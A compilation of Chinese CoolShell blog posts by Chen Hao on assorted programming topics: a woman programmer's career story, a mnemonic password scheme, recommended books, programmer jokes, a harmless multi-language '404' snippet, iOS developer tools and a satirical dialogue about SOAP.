4\. AtomicLong可不可以废掉？   我的想法是可以废掉了，因为，虽然LongAdder在空间上占用略大，但是，它的性能已经足以说明一切了,无论是从节约空的角度还是执行效率上，AtomicLong基本没有优势了，具体看这个测试（感谢Lemon的回复）:http://blog.palominolabs.com/2014/02/10/java-8-performance- improvements-longadder-vs-atomiclong/（全文完）# 一个女程序员的故事作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn因为有人在酷壳里评论里说我给一个女程序员的建议不靠谱，我不服，因为我的工作经历中的一些女程序员都很不错，比那些男程序员都强，所以，我在新浪微博和twitter上征集女程序员的故事和想法，这两天来，我收到了好几封邮件，让我很感动。其中，有一个故事让我回味很久，在脑海里挥之不去，可能是因为她的经历和我很相似，她的想法和我很有共鸣。本来，我想通过收到的这些故事然后编辑成一篇关于女程序员的文章，但是我觉得这个故事已经足够好了，任何的编辑都是对这个故事的不尊重，所以，我原封不动，一字不改地把这个故事转到这里。我把一些我认为精彩的地方加了粗。
当然，我还是会再写一篇关于女程序员的文章，酷壳2011年底的最后篇文章和2012年的第一篇文章都是给女程序员的，因为，我为你们骄傲！从哪里说起呢，我的程序员之路。有些话只是自己心里想的很明白，还从没说过。希望你有耐心看完，因为我的故事不精彩，也算不上奋斗史。我的文笔和叙事能力也很差。高中报志愿的时候坚定的报了计算机技术及应用，当时对计算机的认识只是机房里的苹果机，和老师教的用basic 输出一个正方形之类的。 我当时觉得我对计算机一无所知，我想了解他，就选择了这个专业，当然当时程序员的收入也是可观的。 ：）大学四年下来，我的成绩不好，基础也不好，没拿过奖学金。大学的课程很多不喜欢，我不知道为什么计算机系还要学高等物理，和马列毛邓。这是题外话。说实在的，很多课上的我一头雾水。毕业后找工作不满意，我直接去读了软件工程（考研的专业课成绩没到线）。两年制，一年上课，一年实习。我想给自己的履历上增加一些至少能给我面试机会的经历。（我仔细思考过我成绩不好的原因，心里因素是主要的，高中在重点中学，我不能接受自己不是尖子生的事实，总在想自己为什么这么差，以至于这样的心情影响了我很多年，一直到工作后的几年）
**实习的第一家公司是个私企，工作两周后他们不满意辞退了我，沮丧是当然的，我知道我的能力是有差距的。虽然他们没有任何培训，直接拉去干活，起码的业务流程也没给我讲，但是我真的发自内心感谢他们辞了我，让我认清了自己** 。其实当时干的就是一些perl 脚本和php的网页开发。实习的第二家也是私企，给运营商做项目。我参加的是一个工作流项目，用java开发。我当时的java技术仅限书本身的不怎么牢靠基础知识，至于怎么设计这个系统也没有一点概念，终于一个月后我决定退出了。 **经过这一个多月，我似乎知道了自己该从哪里开始了。就从java开始吧** 。经同学介绍，去了第三家实习公司，面试的经理对实习生要求不高，让我能有机会实习。做的是银行和证券公司的网站，我主要做前端jsp的页面，同时我也选修了学校请的一位Weblogic的工程师开设的J2EE的课程。总算开始入门了。公司的同事很帮助我，有耐心让我了解了系统后台的架构。后来我随几位去客户那里出差，周末和晚上加班，为了他们临时改的需求。同事说，你一个女生出差一点不发憷啊。其实我一点不觉得累。同组的team lead没事就鞭策我说，你就甘心写code么，不能总是做开发，该为以后想想。但是我当时想法是，我的视野当时有限，还不确定自己能做成什么样子。我在这家公司完成了毕业论文。然后毕业。
毕业找工作，我没有留在实习的公司，我想多试试。找工作的经历不多，我去过联想面试，笔试过了，一面是HR面，题目现在大概还记得，如果有化学家，天文学家，医生，乞丐，孕妇，在一个荒岛上，你只能带走一个，你带走谁呢？分组讨论，得出一致的结论，也要说出自己的结论。 同组有清华的毕业生，真的很自信，她说要带走天文学家。我说，出于人道，我肯定带走孕妇。后来就没了消息。难道医生可以留下照顾孕妇么，还是HR以为我选孕妇是注重家庭的人，没有事业心呢，我觉得这题真的不能说明什么。之后面试了一家日资企业，一面是很多人一起面，我听了一圈之后，觉得自己有些把握，因为同组的人比我差，看来我运气挺好的。他们之中有本科生，有研究生，都是男生，就我一个女生。问的也挺基础，就是servlet如何工作，写没写过SP，其中有个人问，什么是SP，没人理他，我告诉他是store procedure。面试官是个部长。 **后来HR的人过来让我留下二面，说我一面打败了所有男士。** 说来惭愧，我真的是运气好，没碰到牛人。二面经理只问了些平常的问题，就过了，于是我来到这家工作。考虑的是，外企多少工作流程上比较规范，也见见日本人是怎么工作的，还有就是自己能力有限，欧美大公司估计是没戏的，我还是从力所能及的开始吧。
日本人工作的风格大家应该有所耳闻，就是喜欢加班，我进公司的第一个项目是代码改造，把VB6.0d code重写为VB.net。 加班到凌晨是常事，另外一个就是team lead的风格是没事也不能早走，也得耗到半夜才行。开始做的真是一点技术含量都没有，都是日本人写好guide，告诉你什么改成什么，别问为什么，不能有异议，他们怎么说你怎么改。弄得我当时都不去思考这里的技术细节，这是我当时犯傻的表现。除了技术本身，还有很多需要学习的。后来陆续做了一些我喜欢的java的项目，用到了sping，hibernate，ibatis, struts, ant等等。还有一些日本人自己开发的框架。每个项目的业务也都不同。在这家工作了三年，我觉得这不是我要的，我的技术提高有限，做的事都是别人设计好，甚至告诉你code应该如何写，而且做事风格不是我想要的。 我想去欧美文化的公司试试。也想做通讯相关的。同学帮我投简历，我面试一家对欧美的外包企业，一面是本公司的人面，问了项目情况，说了说英语，我准备还算充分，过了，二面是公司的客户面，到公司和客户开电话会议面试，第一次和老美直接对话，我虽说有点紧张，但是还是专心听他的问题，听不清的就让他重复一遍，我现在记得的一个问题是如何写出高效的SQL。面完回家等通知。过了几天我收到了offer。
客户是为运营商提供软硬件服务。我们做的是BOSS系统的一个模块。都是java api。 几乎用到了J2EE中定义的所有组件和java相关的框架。我在这家工作至今。技术从不熟悉到熟悉，业务逻辑从不熟悉到熟悉，都是在开发每个feature和改的defect中慢慢了解的，硕大的系统不允许我一口吃个胖子。 **只要脑子里绷根弦就每天都有进步** 。加班不是常事，但是也有紧张的时候。 有时候一个defect要跟踪成千上万行代码，你才知道哪里出了问题，这是需要耐心和细心的。给客户的客户做support的时候， **经常被半夜的电话叫醒去看一个现场的问题，我不觉得累和烦，我觉得这是我价值的体现** （当然这不会每天发生）。修复一个defect我会有一点小小的成就感，每天晚上回家方便的话也会看看邮箱，看看有没有紧急的事情。 **有的人认为你下班了就没必要再管工作邮箱了，但是我愿意这么做，我觉得这是我职业精神的一部分，也是工作态度** 。偶尔会帮着公司招聘毕业生，有时候会遇到什么简单问题都答不上来的人，我感觉就像看见当初刚毕业的我，临走，我会说一句，没关系，回去好好准备，看看基础知识。我曾经怀疑过自己是否适合做技术，总觉得自己不如男生，也总在问自己的路在哪。而且没有自信，曾经紧张到，有人看我打字，都紧张的手抖。到现在，我觉得做技术挺好，就像你说的，我清楚的认识自己，我不是技术大牛，就每天写着自己的code，了解业务，挺好，但是不代表我不上进。很多女同学现在都不做技术了，也不写code了，但是我还在做，甚至越来越喜欢，在中国有种普遍的想法是，作几年技术该转去做管理，否则认为你不成功，这是人云亦云的说法。我想我为什么不能一直做技术呢？虽然中国的大环境可能不适合你一直做技术，但是我愿意试试。我不愿意放弃多年来积攒的一点点优势。何况我现在工作上越来越得心应手， **不久前，我收到客户的邀请，他们想让我transfer到美国或者加拿大成为他们的一员，我在等待漫长的人事流程，也有可能会pending。但是我无所谓，我现在自信，知道想要什么。一直做技术，怎么了，不行么？**
**谈到男女程序员的问题，有些男人以技术强自居，而少了一点谦逊和工作的严谨。有些技术不强的，有些懒散，得过且过。都是我遇到过真实的人。同组的一个女生来了几个月就比一个来了一年多的男生上手快，这说明什么的，态度和努力是重要的。我更认同的是技术和男女无关，和个人有关，任何以偏概全都是片面的** 。同组的男同事们没有因为我是女性而轻视我，我很感谢他们，在一个team工作，技术是必要条件不是充分条件，合作，交流，态度，遵守流程，任何一个都缺少不了。 **如果我只是技术差点，那么我提高的空间是很大的。 多看看书，真的不难** 。虽然我可能离amazon或者是google这些企业的要求还有差距，但是那是我的方向 **。不过像baidu，腾讯这些流氓公司，给我多少钱也不去，女程序员也是有傲骨的** ，虽然也有可能他们看不上我的能力，但是，那又有什么所谓呢。如果你能看完我这如白开水的文字，很感谢，因为我写的实在太不好了，这些经历普通不过，也证明我是个普通的人， **如果我高中的时候不那么在意自己是不是优秀生，就能放轻松，大学（也在想这些）会有个好成绩，没准我就能如愿的毕业就进欧美大企业，不过那样我可能也少了以上跌入谷底的经历和现在平和的心态，我想后者对我更有意义** 。
不用署名，有的话，一个女程序员，哈哈。有错误处，见谅，中午休息，仓促的回顾了这些。技术本身心得有限，我就不班门弄斧了，还需努力。也请不要注我的微薄行号啦。另外我老公也是程序员，我和他能谈些技术和项目上的事情，我想是非女程序员感受不到的乐趣，哈哈哈。看到这里你还不想为她鼓掌吗？最后，请让我我再次征集——call 所有的女程序员，我想给你们写一篇blog，希望你们能和我分享你们的程序员的经历和技术心得。你是男程序员也没有问题，也欢迎分享你身边女程员的故事。 大家可以发邮件至：haoel(at)hotmail.com（全文完）# 一些鲜为人知的编程事实作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn文章来源：我的程序员经历让我明白了一些关于软件开发的事情。下面是一些在编程中可能会让人感到诧异的事情：* 一个程序员用了大约只用了10%-20%的时间来编码，而且大多数程序员，无论他的水平如何，其平均每天只有10-12行的代码最终会进入最终的软件产品中。这是因为，优秀的程序员会花费90%的时间来思考、调查、研究最佳的设计。而糟糕的程序员则会花费90%的时间来调试代码，并随意地改动代码并尝试让代码工作起来。
> “A great lathe operator commands several times the wage of an average lathe > operator, but a great writer of software code is worth 10,000 times the > price of an average software writer.” –Bill Gates > > “一个优秀的车工其工资是一个普通车工的好几倍，但是一个优秀程序员写出来的代码比一个普通程序员要值钱一万倍。——比尔盖茨”* 一个好的程序员比一个普通的程序员多十倍的生产率。而一个优秀的程序员的生产率则比普通程序员多20-100倍。这并不是夸张（自从上世纪60年代的研究一直表明这是一个事实）。一个糟糕的程序员并不只是没有产出的——他们并不仅是完成不不工作，而且还会制造出大量的让别人头痛并要去解决的麻烦。* 优秀的程序员花少量的时间写代码——那些代码都会出现在最终的产品中。那些花大量的时间写代码的程序员其实是很懒惰、很无知，或是很自大的，以至于不能使用已经存在了的解决方案来解决已有的问题。优秀的程序员精通于对通用的模式的识别和重用。好的程序员并不害怕持续地重构/重写自己的代码，直到达到最理想的方案。糟糕的程序员的代码基本上都缺少概念一致性，代码冗长，缺少层次和模式，所以，也就很难被重构。所以，重写他们的代码要比重构他们的代码要容易得多。
* 软件和其它一切事物一样，都遵循着一致性规则。持续得更改只会让软件变成一潭烂泥，其破坏了原始设计的概念一致性。软件产品变成泥沼是不可避免的事情，但是因为程序员不考虑软件概念一致性而导致软件产品更为快速地成为泥沼，这种速度快得可能 会在软件产品还没有完成时，软件产品已经变得没有价值。设计概念一致性的失败通常都会导致软件项目的失败（而第二大导致软件项目失败的原因则是发布的软件并不是用户想要的）。软件变成烂泥的速度正在呈指数级下降，太多的项目在被完结前都面临着激增的时间和成本。* 一个 2004 研究报告 指出，大多数的软件项目 (51%) 都会在关键环节出问题。而15%的项目则是完全失败，当然，这比1994年有了很大的进步，当时完全失败的项目是是31%。* 虽然，几乎所有的软件产品都有些开发团队，但其并不是民主的。通常，只有一个人负责设计，而剩下的人去实现细节。* 编程是一个辛苦的工作。其是一个巨烈的脑力劳动。好的程序员24×7地在思考他们的工作，他们一般都在在洗澡和梦中编写软件中最重要的代码。因为最重要的工作只能在键盘之外完成，软件项目不可能因为加班或是加人来加快进度。（全文完）# 如何管理并设计你的口令
作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn在互联网上，需要我们输入用户名口令的地方实在是太多了，多得都让人记不过来了，N个电子邮件帐号，QQ， MSN，校内，开心，facebook，Blog，各种论坛，网银，淘宝，电子相册……，太多了，想想看，你要用多少用户名口令，相信很多人可能会这样做，用几乎一样的口令和用户名来申请所有的这些帐号，我估计这是大多数人的做法。当然，这样一来，你就需要保管好你的用户名和口令了，因为只要被破解了，就相当于你所有的帐号被破解了，这是多数恐怖的一件事情啊。你可能觉得别人破解你的口令很难，但我告诉你也许会非常容易，因为，如果你只使用一样的用户名和口令的话，也许某天，你注册了一个不知名的小网站，可能会意味着你所有的用户名和口令都被人获取了，要小心啊。对我来说，我通常会有几组组帐号和密码，* 一个帐号/密码是用于一些大的可以依赖的站点，如：MSN，gmail，linkedin，facebook，hotmail等，因为我相信这些站点应该可以足够信任不会出卖用户信息，也有足够的能力不会让用户信息和口令外泄。   * 一个帐号/密码用于一些国内的一些大的网站，如：QQ，开心，CSDN，Sina，网易，Blog，同学录等，因为这些站点必竟还受到国家的监管，以及其内部不良员工可能会倒卖我的信息，指不定什么时候我的用户信息就会外泄。   * 一个帐号/密码用于我的一些经济活动，如网银，淘宝，支付宝什么的。   * 最后一个帐号/密码用于登录那些必需要注册的破站点，一个最简单的用户名口令。
真烦啊。在这样的一个社会里，忘记密码绝对是一件最普通不过的事情了。就算是我这样的分组归类，同样需要超强的记忆力。不知道你会不会把你的密码写在某处呢？是啊，我也是想写啊，但那岂不是相当的危险，不丢则已，一丢就全丢了。今天，在国外的某论坛里看到了这样的一个设计方法，好像很不错，分享给大家。1）首先，先找一句你喜欢的话（你一辈子都记得的话），当然，只有你记得的，无论中英文，然后取各个单词或字的英文、拼音、五笔头一个字母。比如： **I** **L** ike **L** ong **C** omplicated **P** asswords, **T** hey **C** onfuse **P** eople，取头一个字母则成为了： **illcptcp** 。中文的——“信春哥得永生”的五笔的第一个字母是： **wdstyt** 。这个东西只有你自己知道，就算是别人看到明码，也很难马上记下来，是吧。2）加上一些数字吧，比如你的生日，学号，电话，纪念日等。比如世界末日：2012年的12月21日(我们只取12月21日)。把这些数字加在断句的地方，于是得到这样的口令： **illcp12tcp21** 或是 **wds12tyt21** 。
3）我们把第二步得到的口令叫基本口令。然后你可以在其前后(或是中间)加上站点的简称（用大写）。如：* gmail： **GM** **illcp12tcp21**   * CSDN： **CS** **wds12tyt21DN**   * MSN **： **illcp12tcp21MSN****   * **QQ： **Q **wds12tyt21Q******4）改良。你可以在上述的第2）步，在输入数字时按着Shift键，于是，你可以得到更BT的口令： **[[email protected]](/cdn- cgi/l/email-protection)@! **，或是在第3)步聚的前缀和后缀间加上特殊字符，如：&, ＃，^等等。相信这样的规则会让你的口令即不重复，又好记，而且又足够复杂。不然，你真的要去下载一个软件来记你的口令了。大家不妨也说说你的口令的设计或管理方法。(全文完)# 参透软件开发的本质 – Uncle Bob Martin 推荐的经典书籍作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn数量级25（10^25）是 Uncle Bob 在 RailsConf 演讲的主题。如果你用一台 PDP 8（ 1960年代的计算机）和 Mac PowerBook 做比较的话，你会发现 Mac PowerBook 比 PDP 8 快8000倍，有6百万倍大的内存，11000倍的耗能，1500倍的容量等等。如果将这些0累加起来，很容易达到10^25。在过去40年里，我们的硬件计算能力获得了10^25倍的提升，而作为软件开发人员的我们并没有利用这些计算能力来提升多少我们的软件开发能力。没错，我们是写了不少的代码，但是它们基本上都是一些顺序语句，if 语句，和 while 循环等，没有什么新鲜的东西。你可能会说面向对象是新东西呀，但是那只是另外一种组织顺序、选择和迭代等语句的方法而已。除我们现有的编程语言之外，如果有新的编程语言能够产生并创造新的“微积分学”，从而将软件开发提高到一个新的高度，将会是一件非常令人期待的事情，因为顺序语句，选择语句和迭代等最终将成为历史。
Uncle Bob 认为以下四本书是软件开发人员必须阅读的，并由他自己来排名。1\. The Structure & Interpretation of Computer Programs 计算机程序的构造和解释 （By Harold Abelson & Gerald Sussman）书中使用的是 Scheme 语言（Lisp 的一个变种），此书的内容曾经是 MIT 计算机系的一门课程，当然现在已经不是了。2\. Structured Programming 结构化程序设计 （By Edsger W. Dijkstra）相信软件专业的同学们都上过此课程，我们的启蒙书籍。这本书讨论了 go to 是怎样的邪恶，同时也讨论了面向对象。对比一下今天我们视为 best practice 的测试驱动开发（TDD），go to 在过去也曾经是 Fortran，Cobol 等语言的核心。3\. The Annotated TURING （By Charles Petzold）Uncle Bob 令人尴尬地忘记了这本书的名字，他自嘲说自己从来记不住这本书名。但是此书在他的推荐列表中列第三位。4\. Clean Code （By Robert C. Martin）
Uncle Bob 本人的大作。我的一位同事将这位 Uncle Bob 视为软件开发领域中的上帝，Uncle Bob 这位大师在当下各类编程语言和平台层出不穷的时候，在我们为该学什么语言买什么书举棋不定的时候，推荐给读者这几本经典，也许是煞费苦心地想让我们参透软件开发的本质吧。不过会不会也是因为我们都在慢慢变老，许多旧的东西如今又变成了新鲜有趣的事情啦？（出自采访记者之口）_文章来源_# 程序员的相关笑话（一）作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn目录* 问答   * 刹车失灵   * 关于编程语言   * 自行车   * 火车   * 问路   * 警告#### 问答Q：你是怎么区分一个内向的程序员和一个外向的程序员的？   A：外向的程序员会看着你的鞋和你说话时。Q：为什么程序员不能区分万圣节和圣诞节？   A：这是因为Oct 31 == Dec 25！（八进制的31==十进制的25）#### 刹车失灵有一个物理学家，工程师和一个程序员驾驶着一辆汽车行驶在阿尔卑斯山脉上，在下山的时候，忽然，汽车的刹车失灵了，汽车无法控制地向下冲去，眼看前面就是一个悬崖峭壁，但是很幸运的是在这个悬崖的前面有一些小树让他们的汽车停了下来，而没有掉下山去。三个惊魂未定地从车里爬了出来。
物理学家说，“我觉得我们应该建立一个模型来模拟在下山过程中刹车片在高温情况下失灵的情形”。工程师说，“我在车的后备厢来有个扳手，要不我们把车拆开看看到底是什么原因”。程序员说，“为什么我们不找个相同的车再来一次以重现这个问题呢？”#### 关于编程语言如果C++是一把锤子的话，那么编程就会变成大手指头。如果你找了一百万只猴子来敲打一百万个键盘，那么会有一只猴子会敲出一段Java程序，而其余的只会敲出Perl程序。一阵急促的敲门声，“谁啊！”，过了5分钟，门外传来“Java”。如果说Java很不错是因为它可以运行在所有的操作系统上，那么就可以说肛交很不错，因为其可以使用于所有的性别上。#### 自行车一个程序员骑着一个很漂亮的自行车到了公司，另一个程序员看到了他，问到，“你是从哪搞到的这么漂亮的车的？”骑车的那个程序员说，“我刚从那边过来，有一个漂亮的姑娘骑着这个车过来，并停在我跟前，把衣服全脱了，然后对我说，‘你想要什么都可以’”。另一个程序员马上说到，“你绝对做了一个正确的选择，因为那姑娘的衣服你并不一定穿得了”。#### 火车一个年轻的程序员和一个项目经理登上了一列在山里行驶的火车，他们发现列车上几乎都坐满了，只有两个在一起的空位，这个空位的对面是一个老奶奶和一个年轻漂亮的姑娘。两个上前坐了下来。程序员和那个姑娘他们比较暧昧地相互看对方。这时，火车进入山洞，车厢里一片漆黑。此时，只听见一个亲嘴的声音，随后就听到一个响亮的巴掌声。很快火车出了山洞，他们四个人都不说话。
那个老奶奶在喃喃道，“这个年轻小伙怎么这么无礼，不过我很高兴我的孙女扇了一个巴掌”。项目经理在想，“没想到这个程序员居然这么大胆，敢去亲那姑娘，只可惜那姑娘打错了人，居然给打了我。”漂亮的姑娘想，“他亲了我真好，希望我的祖母没有打疼他”。程序员坐在那里露出了笑容，“生活真好啊。这一辈子能有几次机会可以在亲一个美女的同时打项目经理一巴掌啊”#### 问路有一个驾驶热气球的人发现他迷路了。他降低了飞行的高度，并认出了地面上的一个人。他继续下降高度并对着那个人大叫，“打扰一下，你能告诉我我在哪吗？”下面那个人说：“是的。你在热气球里啊，盘旋在30英尺的空中”。热气球上的人说：“你一定是在IT部门做技术工作”。“没错”，地面上的人说到，“你是怎么知道的？”“呵呵”，热气球上的人说，“你告诉我的每件事在技术上都是对的，但对都没有用”。地面上的人说，“你一定是管理层的人”。“没错”，热气球上的人说，“可是你是怎么知道的？”“呵呵”，地面上的那人说到，“你不知道你在哪里，你也不知道你要去哪，你总希望我能帮你。你现在和我们刚见面时还在原来那个地方，但现在却是我错了”。#### 警告有一个小伙子在一个办公大楼的门口抽着烟，一个妇女路过他身边，并对他说，“你知道不知道这个东西会危害你的健康？我是说，你有没有注意到香烟盒上的那个警告（Warning）？”
小伙子说，“没事儿，我是一个程序员”。那妇女说，“这又怎样？”程序员说，“我们从来不关心Warning，只关心Error”(你还有更多的笑话吗？欢迎告诉我们)# Google图片搜索下的的C String作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn周五了，来轻松一下。如果你在Google的图片搜索里搜索“C String”，你会看到很多相当Sexy的图片，C String真是很性感，丁字裤（T String）已经算不了什么了，看了一下图片，才发现原来还有男士了，太猛了。如果C String是这个样子，那么，其尾部应该有null终止符，而且最危险的是缓冲区溢出（Buffer Overflow）。哈哈。# StackOverflow的404错误页作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn不知道大家有没有注意到StakeOverflow的404错误页面？其显示了下面的这个图片：这个是一个很有意思的图片，不知道你看懂了吗？看上去像Python，又像 Ruby，还像 Perl，当然也有 C的影子，还有Brainfuck。是的，这是一个杂交程序，杂交了Python，Ruby，Perl，C，还有Brainfuck（注意其中的#号），所有的语句都是输出“404”字符串。
关于这种杂交程序，本站以前也发布过《C语言和sh脚本的杂交代码》，大家可以前往一看。这样的有趣的玩法叫“Polyglot”，也就是说，把N种语言写在一个文件中，然后，该文件在任何编译器下都可以运行，上述的那段代码在Python，Ruby，Perl，Brainfuck下都可以正常运行，也可以被C和的编译器编译通过，并被运行。下面是这个图片的字符码，以供各位试试。# define v putchar     #   define print(x) main(){v(4+v(v(52)-4));return 0;}/*     #>+++++++4+[>++++++<-]>++++.----.++++.*/     print(202*2);exit();     #define/*>.@*/exit()欢迎你留下你的看法。（全文完）# VIM有趣的命令作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn前几天逛豆瓣，发现了VIM一个有趣的小技巧。在VIM中输入:h!试试看会发现什么。再输入:h 42呢？又会有什么发现？# 10个必需的iOS开发工具和资源
作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn界面总不是一件很容易事，尤其是iPhone/iPad的界面，做过iOS开发的程序员，一定会感到开发iPhone/iPad的界面是一件多么不容易的事。下面的文章来自10 Essential iOS Developer Tools & Resources，这个文章介绍了十个iOS开发的基础性工具和资源，其一定会很有效地帮你做iOS的开发。（在这里，我再闲扯一句，虽然Android的开发好像整整XML文件界面就出来了，其明显比iOS的开发要容易很多，但是我还是觉得iOS的生命力要强过Android，看看Android今天的应用就知道，有时候入门门槛低不是一些好事，大多数的程序员搞出来的Android代码和软件简直令人作呕，就像不是每个人都能烧得手好菜一样。（“食客与大厨”，也许偏激，但值得你我思考），又把蛋扯远了）目录* 1\. Omnigraffle + Ultimate iPhone Stencil   * 2\. Glyphish Icons   * 3\. teehan + lax iPhone 4 GUI PSD   * 4\. Stanford University iPhone Development Lectures   * 5\. 71 Squared   * 6\. Charles   * 9\. MBProgressHUD   * 10\. Apple Documentation
#### 1\. Omnigraffle + Ultimate iPhone StencilOmnigraffle 是一个很强大的像Microsoft Viso的一个软件，其只能于运行在Mac OS X和iPad平台之上。它曾获得2002年的苹果设计奖。在这里，你可以下载 Ultimate iPhone Stencil ，然后使用Omnigraffle 来非常快地制作你的iPhone应用的演示界面。（查看了一下Omnigraffle 的iPad版，真贵，$49.99。作者居然推荐买，TNND，一看就是托）。Omnigraffle Link, Ultimate iPhone Stencil Link#### 2\. Glyphish Icons你可能能从上面的这些图标中看到Flipboard 和 Twitter 在iOS上的应用使用了其中的一些图标。是的，这些个小图标对你的开发很有帮助。作者强烈推荐你花$25去购买 Glyphish 的Pro版。当然啦，你都能花$99/year开发iOS的程序，你还怕花这区区的25刀？Glypish Link#### 3\. teehan + lax iPhone 4 GUI PSD
teehan+lax 是一个加拿大多伦多的代理商。他们经常发布一些他们自己内部用的资源， iPhone 4 GUI PSD 就是其中的一个，这是一个PSD资源文件其包括了iPhone 4的UI 视图控制和一般的UI元件。这是免费让你下载的。teehan + lax iPhone 4 GUI PSD Link#### 4\. Stanford University iPhone Development Lectures斯坦福大学iPhone开发教程，这可能是iOS开发者的圣经级的课程了，你可以从 iTunes U上下载，当然，国内的各大门户公开课也有这个视频，还有中文字幕。比如网易公开课：iTunes U Link#### 5\. 71 Squared如果你要搞iPhone的游戏开发，那么你可看看 71 Squared 上的资源和教程，让你从零开始搞iPhone游戏。不知道你有没有听说过 Tiny Wings 这个由 Andreas Illiger 开发的很漂亮的并获得很大成功的游戏？Andreas 就是从这个网站上学习开发的。这个网站的的资源太丰富了，你绝对不能错过。71 Squared Link
#### 6\. Charles如果你想让你的应用发出一个HTTP请求，并通过仿真器来调试，这恐怕是一件很难的事。 Charles 是这样一个工具其强在让你看到所有的和互联网交互的请求。这个无价的工具可以让你节省巨大的时间来debug你的应用。当然，要价$50啊，很不便宜，但是还是那句话，$99刀一年你都花了，你还在乎这点钱？嘿嘿嘿Charles Link## 7\. ASIHTTPRequest和 Charles一样， ASIHTTPRequest 也是一个强大的封装其由 CFNetwork API构造。如果你想要从你的iPhone上调用一个Web API，那么 ASIHTTPRequest 一定会省你很多事。这个东西的文档极端的不错，并有成千上万的有用的功能几乎覆盖了所有的事，比如： PUT, DELETE, GET, POST 全都没有问题。ASIHTTPRequest Link## 8\. Stack OverflowStack Overflow 这个东西不用说了吧。我个人认为这是这个世界上最佳的问问题的地方，就算你不问，你就上去查一查，你也能看到一大堆已经有人问过的问题。通过问题来加深认识，是进阶的要做的事。在stakeoverflow面前，什么CSDN，it- pub，等等国内的技术问题解决网站完全不值一题。
Stack Overflow Link#### 9\. MBProgressHUDMBProgressHUD 是一个用来做没有文档的 UIProgressHUD UIKit 类的替代品。其就是用来显示一个正在下载中的指示器。这个东西很容易使用，并且有很好的文档，你需要几分钟就可以把其集成到你的应用中。你可以到 github repository上查看其资料。作者号称其99%的应用都使用了这个东西。MBProgressHUD Link#### 10\. Apple Documentation作者说，最后一个资源也是最好的一个，那就是苹果的官方文档 Apple Documentation，示例代码，视频，各种类的参考文档，你在开发过程中绝对无法离开它。在你去Stack Overflow和Google的时候，你应该先去看看这个文档。iOS Documentation Link上面是原作者介绍的一些资源，看起来是给初学者用的，我也是初学者，在 **这里想问一下各位熟悉iOS开发的大拿，在这个基础上，你们有没有什么推荐？**_**—-更新 2011/8/3，新浪微博上我以前的一个同事给了大家下面的推荐—-**_
//@李杨iBabyNote：加上Three20吧，一个非常好的的开源iphone UI library. facebook 用的，品质有保证。 还有tweetero (Open Source Twitter App for iPhone),国内sina/qq微博 API 基本copy twitter. 所以想做iphone上和围脖相关的应用可以参考此代码# SOAP的S是Simple作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn曾经有一个争论，一边是站在SOAP这边的人，另一边则是其它人。 站在SOAP这边人，当他们在争论SOAP和Web Service框架的复杂度时，SOAP这边的人说，在引入那些WS-*东东之前，SOAP的确是简单的，这就是为什么SOAP的第一个字母S就是Simple。在2000年的时候，有一个苦恼的程序员，**程序员** : 不好意思，我的老板这周末去打高尔夫了，现在我不得不要搞一个SOAP的应用，但是我根本不知道什么是SOAP。SOAP专家，你能帮我吗？**SOAP专家** : 当然可以。首先，我要告诉你，SOAP 就是 Simple Object Access Protocol.
**程序员** : 哦，那么说来，他是简单的罗？**SOAP专家** : 简单的就像星期天一样，我的朋友。**程序员** : OK，快跟我说说。**SOAP专家** : 好，就像他的名字一样，SOAP用为远程对象访问。**程序员** : 像CORBA一样？**SOAP专家** : 正是如此，就是像 CORBA，只是更简单。不需要复杂的传输协议，还要设置防火墙，SOAP用的是HTTP。而且我们用的是XML作为传输数据格式而不是二进制。**程序员** : 听起来很不错哦，告诉我它是怎么工作的？**SOAP专家** : 没问题。首先，有一个SOAP信封，其相当的简单。就是一个XML文件由head和body组成。在body中进行你的RPC调用。**程序员** : 哦，这就是所有的RPC的东西？**SOAP专家** : 确对是的。就像我所说的，你的RPC调用的方法名和其参数都需要写的这个XML文档的body中。方法名是在最外层的tag，每一个嵌套的子tag就是其参数。并且所有参数的类型都可以被指定，请看能规格说明书的第五节。**程序员** : (阅读第五节) 还好，不算太坏。**SOAP专家** : 现在，当你的服务开发完后，你需要指定endpoint.
**程序员** : Endpoint?**SOAP专家** : Endpoint, 就是服务的地址。你需要使用HTTP的 POST 方法把SOAP 信封放到 endpoint的 URL.**程序员** : 如果我使用HTTP的GET方法什么怎么样？**SOAP专家** : 不知道，使用GET的行为 undefined.**程序员** : 哼哼。那么，要是我把我的服务移到别的 endpoint上？我是否可以得到一个301错误？**SOAP专家** : 不会的，SOAP不会返回HTTP的错误码。**程序员** : 那么，当你说SOAP使用HTTP，你的意思是说SOAP在HTTP打了个洞？**SOAP专家** : 哦，别说得那么难听，应该说， SOAP 是一个传输协议。**程序员** : HTTP 就不是吗？那是应用层的协议啊。总之，SOAP支持了别的什么传输协议？**SOAP专家** : 官方地来说没有。但是你可以潜在地支持任何的协议。而且有许多的平台支持JMS，FTP还有SMTP。**程序员** : 有人用那那些协议吗？**SOAP专家** : 嗯，没有。不过，我想表达的是，你能够。**程序员** : 好吧。关于 SOAPAction HTTP header，这是用来做什么的？
